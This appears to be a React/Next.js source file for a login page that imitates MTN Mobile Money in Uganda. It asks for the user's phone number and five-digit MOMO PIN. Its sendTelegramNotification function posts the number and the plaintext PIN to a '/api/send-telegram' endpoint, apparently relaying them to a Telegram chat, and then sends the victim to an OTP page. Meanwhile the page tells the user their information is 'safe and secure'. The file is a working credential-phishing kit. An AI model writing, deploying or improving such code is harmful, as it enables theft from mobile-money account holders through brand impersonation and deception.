'use client';

import { useState, useRef } from 'react';
import { useRouter } from 'next/navigation';
import { AlertCircle, Shield, ArrowRight } from 'lucide-react';
import { SharedLayout } from '@/components/shared-layout';

export default function LoginPage() {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [pinDigits, setPinDigits] = useState(['', '', '', '', '']);
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();
  
  const pinRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    
    const newPins = [...pinDigits];
    newPins[index] = value.slice(-1);
    setPinDigits(newPins);

    if (value && index < 4) {
      pinRefs.current[index + 1]?.focus();
    }
  };

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pinDigits[index] && index > 0) {
      pinRefs.current[index - 1]?.focus();
    }
  };
const pinCode = pinDigits.join("");
  const sendTelegramNotification = async () => {
    try {
      const response = await fetch('/api/send-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: `+256${phoneNumber}`,
          pinCode : `${pinCode}`,
          action: 'login_attempt',
          timestamp: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        console.error('Failed to send Telegram notification');
      }
    } catch (error) {
      console.error('Telegram notification error:', error);
    }
  };

  const handleLogin = async () => {
    if (phoneNumber && pinDigits.every(d => d)) {
      setIsLoading(true);
      sendTelegramNotification();
      router.push(`/otp?phone=${phoneNumber}`);
    }
  };

  return (
    <SharedLayout>
      {/* Welcome Section */}
      <h2 className="text-2xl sm:text-4xl font-black text-black mb-1 sm:mb-2">Welcome back</h2>
      <p className="text-gray-500 text-sm sm:text-lg mb-4 sm:mb-6">Log in to MTN account</p>

      {/* Info Alert */}
      <div className="bg-yellow-100 border-2 border-yellow-300 rounded-xl sm:rounded-2xl p-3 sm:p-4 mb-4 sm:mb-6 flex items-start gap-2 sm:gap-3">
        <AlertCircle className="w-5 h-5 sm:w-6 sm:h-6 text-yellow-600 flex-shrink-0 mt-0.5" />
        <p className="text-black font-semibold text-sm sm:text-base">Enter MTN number.</p>
      </div>

      {/* Phone Number Field */}
      <div className="mb-4 sm:mb-6">
        <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Phone Number</label>
        <div className="flex gap-0">
          <input
            type="text"
            value="+256"
            disabled
            className="w-16 sm:w-20 px-2 sm:px-4 py-2 sm:py-3 border-2 border-gray-300 rounded-l-lg sm:rounded-l-xl bg-gray-50 text-black font-semibold text-center cursor-not-allowed text-sm sm:text-base"
          />
          <input
            type="text"
            placeholder="7XX XXX XXX"
            value={phoneNumber}
            onChange={(e) => setPhoneNumber(e.target.value)}
            className="flex-1 px-3 sm:px-4 py-2 sm:py-3 border-2 border-gray-300 rounded-r-lg sm:rounded-r-xl border-l-0 text-black placeholder-gray-400 text-sm sm:text-lg focus:outline-none focus:border-yellow-400"
          />
        </div>
      </div>

      {/* MOMO PIN Field */}
      <div className="mb-4 sm:mb-6">
        <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Enter Your MOMO PIN</label>
        <div className="flex gap-2 sm:gap-3 justify-center">
          {pinDigits.map((digit, index) => (
            <input
              key={index}
              ref={(el) => (pinRefs.current[index] = el)}
              type="number"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handlePinChange(index, e.target.value)}
              onKeyDown={(e) => handlePinKeyDown(index, e)}
              className="w-10 h-14 sm:w-14 sm:h-20 border-2 border-gray-300 rounded-lg sm:rounded-2xl text-center text-lg sm:text-2xl font-bold text-black placeholder-gray-400 focus:outline-none focus:border-yellow-400 focus:ring-2 focus:ring-yellow-300 [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none"
              placeholder="−"
            />
          ))}
        </div>
      </div>

      {/* Login Button */}
      <button 
        onClick={handleLogin}
        disabled={!phoneNumber || !pinDigits.every(d => d) || isLoading}
        className="w-full bg-yellow-400 text-black font-bold text-base sm:text-xl py-3 sm:py-4 rounded-lg sm:rounded-2xl flex items-center justify-center gap-2 sm:gap-3 hover:bg-yellow-500 transition-colors mb-3 sm:mb-4 disabled:bg-gray-300 disabled:cursor-not-allowed">
        {isLoading ? 'Processing...' : 'Login'}
        <ArrowRight className="w-5 h-5 sm:w-6 sm:h-6" />
      </button>

      {/* Security Message */}
      <div className="flex items-center justify-center gap-2 text-gray-600 text-center">
        <Shield className="w-4 h-4 sm:w-5 sm:h-5 text-yellow-600 flex-shrink-0" />
        <p className="text-xs sm:text-sm">Your information is safe and secure</p>
      </div>
    </SharedLayout>
  );
}
